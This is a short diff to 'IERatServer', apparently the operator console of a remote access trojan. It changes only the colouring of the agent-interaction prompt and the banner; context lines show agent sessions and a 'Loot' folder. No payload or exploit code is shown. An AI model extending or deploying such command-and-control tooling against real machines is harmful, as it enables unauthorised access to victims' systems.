@@ -276,7 +276,13 @@ namespace IERatServer
                     var agent = ActiveChannel.agent;
                     Logger.Log("info", $"Interacting with agent {agent.ID}");
                     if (ActiveChannel != null) {
-                        loop._client.Prompt = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ ";
+                        ColoredString test = new()
+                        {
+                            BackgroundColor = ConsoleColor.DarkCyan,
+                            ForegroundColor = ConsoleColor.White,
+                            Content = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ "
+                        };
+                        loop._client.Prompt = test;
                     }
                 }
                 else { Colorful.Console.WriteLine("\n---> Bad ID number!\n"); }
@@ -287,7 +293,9 @@ namespace IERatServer
         public static void RunInteractiveShell()
         {
             Console.WriteLine(Figgle.FiggleFonts.CyberLarge.Render("IERat Server"), Color.LightYellow);
-            Console.WriteWithGradient("\t\t\t\tPowered by Internet Explorer!\t\n\n", Color.White, Color.LightSkyBlue, 24);
+            Colorful.StyleSheet styleSheet = new(Color.White);
+            Console.WriteLineStyled($"\t\t\t\tPowered by Internet Explorer!\t\n\n", styleSheet);
+            //Console.WriteWithGradient("\t\t\t\tPowered by Internet Explorer!\t\n\n", Color.White, Color.LightSkyBlue, 24);
 
             if (!Directory.Exists(ModulesFolder)) { Directory.CreateDirectory(ModulesFolder); }
             if (!Directory.Exists(LootFolder)) { Directory.CreateDirectory(LootFolder); }
